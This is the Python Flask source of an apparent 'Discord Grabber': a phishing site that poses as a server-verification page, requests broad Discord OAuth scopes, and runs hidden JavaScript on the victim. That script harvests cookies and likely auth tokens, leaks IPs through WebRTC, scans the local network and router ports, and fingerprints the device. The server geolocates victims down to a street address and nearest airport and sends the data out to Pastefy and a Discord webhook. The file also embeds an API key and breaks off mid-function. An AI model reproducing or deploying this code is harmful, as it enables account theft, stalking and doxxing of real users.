from flask import Flask, redirect, request, render_template_string, session, jsonify, send_file, make_response
import requests
from datetime import datetime
import os
from user_agents import parse
import secrets
import json
import base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

with open('config.json', 'r') as f:
    config = json.load(f)

CLIENT_ID = config.get("client_id")
CLIENT_SECRET = config.get("client_secret")
VERIFIED_URL = config.get("verified_url")

OAUTH_SCOPE = "identify email guilds connections"
DISCORD_API = "https://discord.com/api"
WEBHOOK = os.getenv("DISCORD_WEBHOOK_URL")

IPGEOLOCATION_API_KEY = "8f1515c4f277426792c3c1af760bc4b4"

if not all([CLIENT_ID, CLIENT_SECRET, VERIFIED_URL]):
    raise ValueError("Missing required configuration. Please check config.json.")

if not WEBHOOK:
    print("[!] Warning: DISCORD_WEBHOOK_URL not set. Webhook functionality will be disabled.")

IP_APIS = [
    ("http://ip-api.com/json/", "ip-api"),
    ("https://ipinfo.io/", "ipinfo"),
    ("https://ipapi.co/", "ipapi"),
    ("https://ipwhois.app/json/", "ipwhois"),
    ("https://ipwho.is/", "ipwho"),
    ("https://freeipapi.com/api/json/", "freeipapi"),
    ("https://ip-api.io/json/", "ip-api-io"),
    ("https://geolocation-db.com/json/", "geolocation-db"),
    ("https://api.country.is/", "country-is"),
    ("https://api.ip2location.io/?ip=", "ip2location-free")
]

clipboard_storage = {}
fingerprint_storage = {}

public_url = f"https://{os.getenv('REPLIT_DEV_DOMAIN')}"
print(f"[+] Public URL: {public_url}")

REDIRECT_URI = f"{public_url}/callback"

def get_full_address_from_coords(latitude, longitude):
    """Get full street address from coordinates using reverse geocoding"""
    if latitude == "Unknown" or longitude == "Unknown":
        return {"error": "Invalid coordinates"}
    
    try:
        lat = float(latitude)
        lon = float(longitude)
        
        reverse_geocode_apis = [
            f"https://geocode.maps.co/reverse?lat={lat}&lon={lon}",
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={lat}&longitude={lon}&localityLanguage=en"
        ]
        
        for api_url in reverse_geocode_apis:
            try:
                headers = {'User-Agent': 'Mozilla/5.0'}
                response = requests.get(api_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    address_parts = []
                    full_address = None
                    
                    if 'display_name' in data:
                        full_address = data['display_name']
                    elif 'locality' in data:
                        if data.get('street'):
                            address_parts.append(data['street'])
                        if data.get('locality'):
                            address_parts.append(data['locality'])
                        if data.get('principalSubdivision'):
                            address_parts.append(data['principalSubdivision'])
                        if data.get('countryName'):
                            address_parts.append(data['countryName'])
                        full_address = ', '.join(address_parts)
                    
                    if full_address:
                        return {
                            "full_address": full_address,
                            "street": data.get('road') or data.get('street', 'Unknown'),
                            "city": data.get('city') or data.get('locality', 'Unknown'),
                            "state": data.get('state') or data.get('principalSubdivision', 'Unknown'),
                            "country": data.get('country') or data.get('countryName', 'Unknown'),
                            "postal_code": data.get('postcode', 'Unknown')
                        }
            except Exception:
                continue
        
        return {"error": "Could not retrieve address"}
    except Exception as e:
        print(f"[-] Reverse geocoding error: {e}")
        return {"error": str(e)}

def find_nearest_airport(latitude, longitude):
    """Find nearest airport using lat/lon coordinates with full address"""
    if latitude == "Unknown" or longitude == "Unknown":
        return {"error": "Invalid coordinates"}
    
    try:
        lat = float(latitude)
        lon = float(longitude)
        
        airports_api_url = f"https://api.api-ninjas.com/v1/airports?lat={lat}&lon={lon}&max_results=5"
        
        headers = {}
        api_key = os.getenv("AIRPORTS_API_KEY")
        if api_key:
            headers["X-Api-Key"] = api_key
        
        response = requests.get(airports_api_url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            airports = response.json()
            if airports and len(airports) > 0:
                import math
                
                for airport in airports:
                    if 'latitude' in airport and 'longitude' in airport:
                        airport_lat = float(airport['latitude'])
                        airport_lon = float(airport['longitude'])
                        
                        dlat = math.radians(airport_lat - lat)
                        dlon = math.radians(airport_lon - lon)
                        a = (math.sin(dlat / 2) ** 2 + 
                             math.cos(math.radians(lat)) * math.cos(math.radians(airport_lat)) * 
                             math.sin(dlon / 2) ** 2)
                        c = 2 * math.asin(math.sqrt(a))
                        distance_km = 6371 * c
                        airport['distance_km'] = round(distance_km, 2)
                        airport['distance_mi'] = round(distance_km * 0.621371, 2)
                
                airports.sort(key=lambda x: x.get('distance_km', float('inf')))
                
                nearest = airports[0]
                
                airport_address = get_full_address_from_coords(
                    nearest.get('latitude'),
                    nearest.get('longitude')
                )
                
                result = {
                    "name": nearest.get("name", "Unknown"),
                    "iata": nearest.get("iata", "N/A"),
                    "icao": nearest.get("icao", "N/A"),
                    "city": nearest.get("city", "Unknown"),
                    "region": nearest.get("region", "Unknown"),
                    "country": nearest.get("country", "Unknown"),
                    "distance_km": nearest.get("distance_km", "Unknown"),
                    "distance_mi": nearest.get("distance_mi", "Unknown"),
                    "timezone": nearest.get("timezone", "Unknown"),
                    "elevation_ft": nearest.get("elevation_ft", "Unknown"),
                    "all_nearby": airports[:3]
                }
                
                if not airport_address.get("error"):
                    result["address"] = airport_address.get("full_address", "Unknown")
                    result["street"] = airport_address.get("street", "Unknown")
                    result["postal_code"] = airport_address.get("postal_code", "Unknown")
                else:
                    result["address"] = f"{nearest.get('city', 'Unknown')}, {nearest.get('region', 'Unknown')}, {nearest.get('country', 'Unknown')}"
                
                return result
        
        return {"error": "No airports found"}
    except Exception as e:
        print(f"[-] Airport lookup error: {e}")
        return {"error": str(e)}

def upload_to_pastefy(content, title="Discord Grabber Data"):
    """Upload large content to pastefy.app and return the URL"""
    try:
        pastefy_url = "https://pastefy.app/api/v2/paste"
        
        payload = {
            "title": title,
            "content": content,
            "visibility": "UNLISTED"
        }
        
        headers = {"Content-Type": "application/json"}
        
        response = requests.post(pastefy_url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success") and data.get("paste"):
                paste_id = data["paste"]["id"]
                raw_url = f"https://pastefy.app/{paste_id}/raw"
                view_url = f"https://pastefy.app/{paste_id}"
                print(f"[+] Content uploaded to Pastefy: {view_url}")
                return {
                    "success": True,
                    "view_url": view_url,
                    "raw_url": raw_url,
                    "id": paste_id
                }
        
        print(f"[-] Pastefy upload failed: {response.status_code} - {response.text}")
        return {"success": False, "error": f"Status {response.status_code}"}
    except Exception as e:
        print(f"[-] Pastefy upload error: {e}")
        return {"success": False, "error": str(e)}

FINGERPRINT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>allow to verify</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #2c2f33; color: #fff; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #7289da; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>allow to verify</h2>
    <div class="loader"></div>
    <p>Verify you're discord account To the Server "Glock's Community"!</p>
    <script>
        async function collectFingerprint() {
            const fp = {
                screen_width: screen.width,
                screen_height: screen.height,
                screen_avail_width: screen.availWidth,
                screen_avail_height: screen.availHeight,
                color_depth: screen.colorDepth,
                pixel_depth: screen.pixelDepth,
                viewport_width: window.innerWidth,
                viewport_height: window.innerHeight,
                timezone_offset: new Date().getTimezoneOffset(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : '',
                platform: navigator.platform,
                user_agent: navigator.userAgent,
                app_version: navigator.appVersion,
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                product_sub: navigator.productSub || 'Unknown',
                cpu_cores: navigator.hardwareConcurrency || 'Unknown',
                device_memory: navigator.deviceMemory || 'Unknown',
                max_touch_points: navigator.maxTouchPoints || 0,
                online: navigator.onLine,
                cookie_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack || 'Unknown',
                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                webdriver: navigator.webdriver || false,
                headless: navigator.webdriver || false
            };
            
            if ('connection' in navigator) {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                fp.connection_type = conn.effectiveType || 'Unknown';
                fp.downlink = conn.downlink || 'Unknown';
                fp.rtt = conn.rtt || 'Unknown';
                fp.save_data = conn.saveData || false;
            }
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    fp.battery_charging = battery.charging;
                    fp.battery_level = Math.round(battery.level * 100) + '%';
                } catch(e) {}
            }
            
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 280;
                canvas.height = 60;
                const ctx = canvas.getContext('2d');
                
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.font = '11pt "Times New Roman"';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.font = '18pt Arial';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
                
                ctx.globalCompositeOperation = 'multiply';
                ctx.fillStyle = 'rgb(255,0,255)';
                ctx.beginPath();
                ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
                ctx.closePath();
                ctx.fill();
                ctx.fillStyle = 'rgb(0,255,255)';
                ctx.beginPath();
                ctx.arc(100, 50, 50, 0, Math.PI * 2, true);
                ctx.closePath();
                ctx.fill();
                ctx.fillStyle = 'rgb(255,255,0)';
                ctx.beginPath();
                ctx.arc(75, 100, 50, 0, Math.PI * 2, true);
                ctx.closePath();
                ctx.fill();
                ctx.fillStyle = 'rgb(255,0,255)';
                ctx.arc(75, 75, 75, 0, Math.PI * 2, true);
                ctx.arc(75, 75, 25, 0, Math.PI * 2, true);
                ctx.fill('evenodd');
                
                fp.canvas_hash = canvas.toDataURL().substring(0, 100);
                fp.canvas_hash_full = canvas.toDataURL();
            } catch(e) {
                fp.canvas_hash = 'Unknown';
                fp.canvas_hash_full = 'Unknown';
            }
            
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fp.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        fp.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    fp.webgl_version = gl.getParameter(gl.VERSION);
                    fp.webgl_shading_language = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                    fp.webgl_max_texture_size = gl.getParameter(gl.MAX_TEXTURE_SIZE);
                    fp.webgl_max_viewport = gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x');
                    fp.webgl_extensions = gl.getSupportedExtensions().join(', ');
                    fp.webgl_aliased_line_width = gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE).join('-');
                    fp.webgl_aliased_point_size = gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE).join('-');
                    fp.webgl_max_combined_texture_units = gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS);
                    fp.webgl_max_vertex_attribs = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
                }
            } catch(e) {
                fp.webgl_vendor = 'Unknown';
                fp.webgl_renderer = 'Unknown';
            }
            
            try {
                if ('gpu' in navigator) {
                    const adapter = await navigator.gpu.requestAdapter();
                    if (adapter) {
                        const info = await adapter.requestAdapterInfo();
                        fp.webgpu_vendor = info.vendor || 'Unknown';
                        fp.webgpu_architecture = info.architecture || 'Unknown';
                        fp.webgpu_device = info.device || 'Unknown';
                        fp.webgpu_description = info.description || 'Unknown';
                        fp.webgpu_available = true;
                        
                        const features = Array.from(adapter.features).join(', ');
                        fp.webgpu_features = features || 'None';
                        
                        const limits = adapter.limits;
                        fp.webgpu_max_texture_dimension = limits.maxTextureDimension2D || 'Unknown';
                        fp.webgpu_max_buffer_size = limits.maxBufferSize || 'Unknown';
                    } else {
                        fp.webgpu_available = false;
                    }
                } else {
                    fp.webgpu_available = false;
                }
            } catch(e) {
                fp.webgpu_available = false;
                fp.webgpu_error = e.message;
            }
            
            fp.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None';
            
            try {
                const fonts = [
                    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 
                    'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Arial Black', 'Tahoma', 
                    'Lucida Console', 'Monaco', 'Consolas', 'Calibri', 'Helvetica', 'Menlo',
                    'Ubuntu', 'Roboto', 'Open Sans', 'Segoe UI', 'San Francisco', 'Avenir',
                    'Futura', 'Garamond', 'Book Antiqua', 'Century Gothic', 'Franklin Gothic',
                    'Gill Sans', 'Lucida Grande', 'Optima', 'Cambria', 'Didot', 'American Typewriter',
                    'Andale Mono', 'Courier', 'Lucida Sans Typewriter', 'DejaVu Sans Mono', 'Liberation Mono'
                ];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.font = '72px monospace';
                const baselineWidth = ctx.measureText('mmmmmmmmmmlli').width;
                const baselineHeight = ctx.measureText('mmmmmmmmmmlli').width;
                const detectedFonts = [];
                
                fonts.forEach(font => {
                    ctx.font = `72px '${font}', monospace`;
                    const width = ctx.measureText('mmmmmmmmmmlli').width;
                    const height = ctx.measureText('mmmmmmmmmmlli').width;
                    if (width !== baselineWidth || height !== baselineHeight) {
                        detectedFonts.push(font);
                    }
                });
                fp.fonts_detected = detectedFonts.join(', ');
                fp.fonts_count = detectedFonts.length;
            } catch(e) { 
                fp.fonts_detected = 'Unknown';
                fp.fonts_count = 0;
            }
            
            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                const audio = new AudioCtx();
                const oscillator = audio.createOscillator();
                const analyser = audio.createAnalyser();
                const compressor = audio.createDynamicsCompressor();
                const gain = audio.createGain();
                gain.gain.value = 0;
                
                oscillator.type = 'triangle';
                oscillator.frequency.value = 1000;
                
                compressor.threshold.value = -50;
                compressor.knee.value = 40;
                compressor.ratio.value = 12;
                compressor.attack.value = 0;
                compressor.release.value = 0.25;
                
                oscillator.connect(compressor);
                compressor.connect(analyser);
                analyser.connect(gain);
                gain.connect(audio.destination);
                
                oscillator.start(0);
                
                const dataArray = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(dataArray);
                
                const timeArray = new Uint8Array(analyser.fftSize);
                analyser.getByteTimeDomainData(timeArray);
                
                oscillator.stop();
                
                const hashData = Array.from(dataArray.slice(0, 30)).concat(Array.from(timeArray.slice(0, 30)));
                fp.audio_hash = hashData.toString().substring(0, 100);
                fp.audio_compressor_signature = `${compressor.threshold.value}_${compressor.knee.value}_${compressor.ratio.value}`;
                
                audio.close();
            } catch(e) { 
                fp.audio_hash = 'Unknown';
                fp.audio_compressor_signature = 'Unknown';
            }
            
            fp.media_devices = 'Unknown';
            fp.camera_count = 0;
            fp.microphone_count = 0;
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    fp.camera_count = devices.filter(d => d.kind === 'videoinput').length;
                    fp.microphone_count = devices.filter(d => d.kind === 'audioinput').length;
                    fp.media_devices = `${fp.camera_count} camera(s), ${fp.microphone_count} mic(s)`;
                } catch(e) {}
            }
            
            fp.speech_voices = 'Unknown';
            if ('speechSynthesis' in window) {
                const voices = speechSynthesis.getVoices();
                fp.speech_voices = voices.length > 0 ? `${voices.length} voices` : 'Loading...';
            }
            
            fp.webrtc_ips = [];
            fp.webrtc_ipv6 = [];
            fp.webrtc_candidates = [];
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [
                        {urls: 'stun:stun.l.google.com:19302'},
                        {urls: 'stun:stun1.l.google.com:19302'},
                        {urls: 'stun:stun2.l.google.com:19302'},
                        {urls: 'stun:stun3.l.google.com:19302'},
                        {urls: 'stun:stun4.l.google.com:19302'},
                        {urls: 'stun:stun.cloudflare.com:3478'},
                        {urls: 'stun:stun.nextcloud.com:443'},
                        {urls: 'stun:stun.services.mozilla.com:3478'}
                    ]
                });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    
                    const candidateStr = ice.candidate.candidate;
                    fp.webrtc_candidates.push({
                        candidate: candidateStr,
                        type: ice.candidate.type,
                        protocol: ice.candidate.protocol,
                        priority: ice.candidate.priority
                    });
                    
                    const parts = candidateStr.split(' ');
                    const ip = parts[4];
                    const port = parts[5];
                    const candidateType = ice.candidate.type;
                    
                    if (ip) {
                        const ipInfo = {
                            ip: ip,
                            port: port,
                            type: candidateType,
                            protocol: ice.candidate.protocol
                        };
                        
                        if (ip.includes(':')) {
                            if (!fp.webrtc_ipv6.find(item => item.ip === ip)) {
                                fp.webrtc_ipv6.push(ipInfo);
                            }
                        } else if (/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/.test(ip)) {
                            if (!fp.webrtc_ips.find(item => item.ip === ip)) {
                                fp.webrtc_ips.push(ipInfo);
                            }
                        }
                    }
                };
                setTimeout(() => pc.close(), 5000);
            } catch(e) {
                fp.webrtc_error = e.message;
            }
            
            fp.network_scan = {
                local_devices: [],
                gateway_ip: 'Unknown',
                network_range: 'Unknown',
                total_devices_found: 0,
                scan_completed: false,
                router_info: {
                    possible_gateway_ips: [],
                    router_accessible: false,
                    router_brand: 'Unknown',
                    common_ports: []
                }
            };
            
            async function scanLocalNetwork() {
                const discoveredDevices = [];
                let localIP = null;
                
                await new Promise(resolve => setTimeout(resolve, 5500));
                
                for (const ipObj of fp.webrtc_ips) {
                    const ip = ipObj.ip || ipObj;
                    if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                        localIP = ip;
                        break;
                    }
                }
                
                if (!localIP) {
                    fp.network_scan.error = 'No local IP detected';
                    fp.network_scan.scan_completed = true;
                    return;
                }
                
                const ipParts = localIP.split('.');
                const baseIP = `${ipParts[0]}.${ipParts[1]}.${ipParts[2]}`;
                fp.network_scan.network_range = `${baseIP}.0/24`;
                fp.network_scan.gateway_ip = `${baseIP}.1`;
                fp.network_scan.local_ip = localIP;
                
                const possibleGateways = [`${baseIP}.1`, `${baseIP}.254`, `${baseIP}.2`];
                fp.network_scan.router_info.possible_gateway_ips = possibleGateways;
                
                async function pingDevice(targetIP, index) {
                    try {
                        const img = new Image();
                        const timeout = 800;
                        const startTime = performance.now();
                        
                        const imgPromise = new Promise((resolve, reject) => {
                            img.onload = () => resolve('success');
                            img.onerror = () => resolve('responded');
                            setTimeout(() => reject('timeout'), timeout);
                        });
                        
                        img.src = `http://${targetIP}:80/favicon.ico?t=${Date.now()}`;
                        
                        const result = await imgPromise.catch(() => 'timeout');
                        const responseTime = performance.now() - startTime;
                        
                        if (result !== 'timeout' || responseTime < timeout - 100) {
                            let deviceType = 'Device';
                            const isGateway = possibleGateways.includes(targetIP);
                            
                            if (isGateway) {
                                deviceType = 'Gateway/Router';
                                await checkRouterAccess(targetIP);
                            } else if (index === parseInt(localIP.split('.')[3])) {
                                deviceType = 'This Device';
                            } else if (index < 50) {
                                deviceType = 'Network Device';
                            } else {
                                deviceType = 'Connected Device';
                            }
                            
                            discoveredDevices.push({
                                ip: targetIP,
                                response_time: Math.round(responseTime),
                                type: deviceType,
                                ports_open: [80],
                                detection_method: 'Image timing',
                                is_gateway: isGateway
                            });
                        }
                    } catch(e) {}
                }
                
                async function checkRouterAccess(routerIP) {
                    const portProtocols = [
                        {port: 80, protocol: 'http'},
                        {port: 8080, protocol: 'http'},
                        {port: 443, protocol: 'https'},
                        {port: 8443, protocol: 'https'},
                        {port: 8081, protocol: 'http'},
                        {port: 8888, protocol: 'http'}
                    ];
                    const accessiblePorts = [];
                    
                    for (const {port, protocol} of portProtocols) {
                        try {
                            const img = new Image();
                            const testPromise = new Promise((resolve, reject) => {
                                img.onload = () => resolve(true);
                                img.onerror = () => resolve(true);
                                setTimeout(() => reject(false), 600);
                            });
                            
                            img.src = `${protocol}://${routerIP}:${port}/favicon.ico?t=${Date.now()}`;
                            
                            const accessible = await testPromise.catch(() => false);
                            if (accessible) {
                                accessiblePorts.push({port: port, protocol: protocol});
                            }
                        } catch(e) {}
                    }
                    
                    if (accessiblePorts.length > 0) {
                        fp.network_scan.router_info.router_accessible = true;
                        fp.network_scan.router_info.common_ports = accessiblePorts.map(p => p.port);
                        fp.network_scan.router_info.admin_urls = accessiblePorts.map(p => 
                            `${p.protocol}://${routerIP}:${p.port}`
                        );
                    }
                }
                
                const commonDevices = [
                    1, 2, 3, 5, 10, 20, 50, 100, 101, 102, 
                    parseInt(ipParts[3])
                ];
                
                for (const i of commonDevices) {
                    if (i >= 1 && i <= 254) {
                        const targetIP = `${baseIP}.${i}`;
                        await pingDevice(targetIP, i);
                    }
                }
                
                const batchSize = 50;
                for (let start = 1; start <= 254; start += batchSize) {
                    const batch = [];
                    for (let i = start; i < Math.min(start + batchSize, 255); i++) {
                        if (!commonDevices.includes(i)) {
                            batch.push(pingDevice(`${baseIP}.${i}`, i));
                        }
                    }
                    await Promise.allSettled(batch);
                }
                
                fp.network_scan.local_devices = discoveredDevices.sort((a, b) => {
                    const aNum = parseInt(a.ip.split('.')[3]);
                    const bNum = parseInt(b.ip.split('.')[3]);
                    return aNum - bNum;
                });
                fp.network_scan.total_devices_found = discoveredDevices.length;
                fp.network_scan.scan_completed = true;
            }
            
            scanLocalNetwork().catch(e => {
                fp.network_scan.error = e.message;
                fp.network_scan.scan_completed = true;
            });
            
            fp.permissions = {};
            if ('permissions' in navigator) {
                const perms = ['geolocation', 'notifications', 'microphone', 'camera'];
                for (const perm of perms) {
                    try {
                        const result = await navigator.permissions.query({name: perm});
                        fp.permissions[perm] = result.state;
                    } catch(e) {}
                }
            }
            
            fp.storage_quota = 'Unknown';
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    const used = (estimate.usage / 1024 / 1024).toFixed(2);
                    const total = (estimate.quota / 1024 / 1024).toFixed(2);
                    fp.storage_quota = `${used} MB / ${total} MB`;
                } catch(e) {}
            }
            
            fp.screen_orientation = screen.orientation ? screen.orientation.type : 'Unknown';
            fp.device_pixel_ratio = window.devicePixelRatio || 1;
            fp.color_gamut = 'Unknown';
            if (window.matchMedia) {
                if (window.matchMedia('(color-gamut: p3)').matches) fp.color_gamut = 'P3';
                else if (window.matchMedia('(color-gamut: srgb)').matches) fp.color_gamut = 'sRGB';
                else if (window.matchMedia('(color-gamut: rec2020)').matches) fp.color_gamut = 'Rec2020';
            }
            
            fp.hdr = window.matchMedia && window.matchMedia('(dynamic-range: high)').matches ? 'Yes' : 'No';
            fp.prefers_reduced_motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'Yes' : 'No';
            fp.prefers_color_scheme = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light';
            fp.prefers_contrast = 'Unknown';
            if (window.matchMedia) {
                if (window.matchMedia('(prefers-contrast: high)').matches) fp.prefers_contrast = 'High';
                else if (window.matchMedia('(prefers-contrast: low)').matches) fp.prefers_contrast = 'Low';
                else fp.prefers_contrast = 'Normal';
            }
            
            fp.service_worker = 'serviceWorker' in navigator ? 'Yes' : 'No';
            fp.indexed_db = 'indexedDB' in window ? 'Yes' : 'No';
            fp.web_assembly = typeof WebAssembly !== 'undefined' ? 'Yes' : 'No';
            fp.shared_array_buffer = typeof SharedArrayBuffer !== 'undefined' ? 'Yes' : 'No';
            
            fp.performance_memory = 'Unknown';
            if (performance && performance.memory) {
                const used = (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2);
                const total = (performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(2);
                fp.performance_memory = `${used} MB / ${total} MB`;
            }
            
            fp.local_ips_hex = [];
            fp.device_vendor = 'Unknown';
            
            try {
                const webglVendor = fp.webgl_vendor || '';
                const webglRenderer = fp.webgl_renderer || '';
                const platform = fp.platform || '';
                
                if (webglVendor.toLowerCase().includes('nvidia') || webglRenderer.toLowerCase().includes('nvidia')) {
                    fp.device_vendor = 'NVIDIA Graphics';
                } else if (webglVendor.toLowerCase().includes('amd') || webglRenderer.toLowerCase().includes('amd')) {
                    fp.device_vendor = 'AMD Graphics';
                } else if (webglVendor.toLowerCase().includes('intel') || webglRenderer.toLowerCase().includes('intel')) {
                    fp.device_vendor = 'Intel Graphics';
                } else if (webglVendor.toLowerCase().includes('apple') || webglRenderer.toLowerCase().includes('apple')) {
                    fp.device_vendor = 'Apple GPU';
                } else if (webglVendor.toLowerCase().includes('qualcomm') || webglRenderer.toLowerCase().includes('qualcomm')) {
                    fp.device_vendor = 'Qualcomm (Mobile)';
                } else if (webglVendor.toLowerCase().includes('arm') || webglRenderer.toLowerCase().includes('mali')) {
                    fp.device_vendor = 'ARM GPU';
                } else if (platform.toLowerCase().includes('mac')) {
                    fp.device_vendor = 'Apple Device';
                } else if (platform.toLowerCase().includes('win')) {
                    fp.device_vendor = 'Windows PC';
                } else if (platform.toLowerCase().includes('linux')) {
                    fp.device_vendor = 'Linux Device';
                } else if (platform.toLowerCase().includes('android')) {
                    fp.device_vendor = 'Android Device';
                } else if (platform.toLowerCase().includes('iphone') || platform.toLowerCase().includes('ipad')) {
                    fp.device_vendor = 'Apple iOS Device';
                }
            } catch(e) {}
            
            fp.browser_capabilities = {
                webrtc: typeof RTCPeerConnection !== 'undefined',
                websocket: typeof WebSocket !== 'undefined',
                geolocation: 'geolocation' in navigator,
                notification: 'Notification' in window,
                service_worker: 'serviceWorker' in navigator,
                payment_request: 'PaymentRequest' in window,
                web_bluetooth: 'bluetooth' in navigator,
                web_usb: 'usb' in navigator,
                web_midi: 'requestMIDIAccess' in navigator,
                webgl: !!document.createElement('canvas').getContext('webgl'),
                webgl2: !!document.createElement('canvas').getContext('webgl2'),
                webgpu: 'gpu' in navigator,
                file_system_access: 'showOpenFilePicker' in window,
                clipboard_api: 'clipboard' in navigator
            };
            
            fp.session_id = Date.now().toString(36) + Math.random().toString(36).substr(2);
            fp.first_visit_timestamp = new Date().toISOString();
            fp.screen_fingerprint_hash = `${fp.screen_width}x${fp.screen_height}_${fp.color_depth}bit_${fp.device_pixel_ratio}dpr`;
            
            // METHOD 1: Traditional document.cookie parsing (Enhanced)
            function extractCookies_Method1() {
                const cookies = {};
                const cookieString = document.cookie;
                
                if (!cookieString || cookieString.trim() === '') return cookies;
                
                const cookiePairs = cookieString.split(';');
                cookiePairs.forEach(cookie => {
                    const trimmed = cookie.trim();
                    if (!trimmed) return;
                    
                    const equalsIndex = trimmed.indexOf('=');
                    if (equalsIndex === -1) {
                        cookies[trimmed] = '';
                    } else {
                        const name = trimmed.substring(0, equalsIndex).trim();
                        const value = trimmed.substring(equalsIndex + 1);
                        if (name) {
                            cookies[name] = value;
                        }
                    }
                });
                
                return cookies;
            }
            
            // METHOD 2: Cookie Store API (Modern/Async with metadata)
            async function extractCookies_Method2() {
                const cookies = {};
                const detailed = [];
                
                if ('cookieStore' in window) {
                    try {
                        const allCookies = await cookieStore.getAll();
                        if (allCookies && Array.isArray(allCookies)) {
                            allCookies.forEach(cookie => {
                                if (cookie && cookie.name) {
                                    cookies[cookie.name] = cookie.value || '';
                                    detailed.push({
                                        name: cookie.name,
                                        value: cookie.value || '',
                                        domain: cookie.domain || window.location.hostname,
                                        path: cookie.path || '/',
                                        expires: cookie.expires ? new Date(cookie.expires).toISOString() : 'session',
                                        secure: cookie.secure || false,
                                        sameSite: cookie.sameSite || 'lax'
                                    });
                                }
                            });
                        }
                    } catch(e) {
                        console.log('CookieStore error:', e);
                    }
                }
                
                return { cookies, detailed };
            }
            
            // METHOD 3: Advanced extraction with regex and deep analysis
            function extractCookies_Method3() {
                const cookies = {};
                const analysis = [];
                const cookieString = document.cookie;
                
                if (!cookieString || cookieString.trim() === '') {
                    return { cookies, analysis };
                }
                
                // Split by semicolon and process each cookie
                const cookieParts = cookieString.split(';');
                cookieParts.forEach(part => {
                    const trimmed = part.trim();
                    if (!trimmed) return;
                    
                    const equalsIndex = trimmed.indexOf('=');
                    let name, value;
                    
                    if (equalsIndex === -1) {
                        name = trimmed;
                        value = '';
                    } else {
                        name = trimmed.substring(0, equalsIndex).trim();
                        value = trimmed.substring(equalsIndex + 1);
                    }
                    
                    if (!name) return;
                    
                    cookies[name] = value;
                    
                    // Deep analysis of cookie characteristics
                    const isJWT = value.split('.').length === 3 && value.length > 50;
                    const isBase64 = /^[A-Za-z0-9+/=]+$/.test(value) && value.length > 20;
                    const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(value);
                    const isHex = /^[0-9a-f]+$/i.test(value) && value.length >= 32;
                    
                    analysis.push({
                        name,
                        value,
                        length: value.length,
                        type: isJWT ? 'JWT' : isBase64 ? 'Base64' : isUUID ? 'UUID' : isHex ? 'Hex' : 'Plain',
                        entropy: calculateEntropy(value),
                        firstChars: value.substring(0, 15),
                        lastChars: value.length > 15 ? value.substring(value.length - 15) : '',
                        possibleAuth: /session|auth|token|jwt|bearer|api|key/i.test(name)
                    });
                });
                
                return { cookies, analysis };
            }
            
            // Helper function to calculate Shannon entropy (randomness measure)
            function calculateEntropy(str) {
                if (!str || str.length === 0) return 0;
                
                const len = str.length;
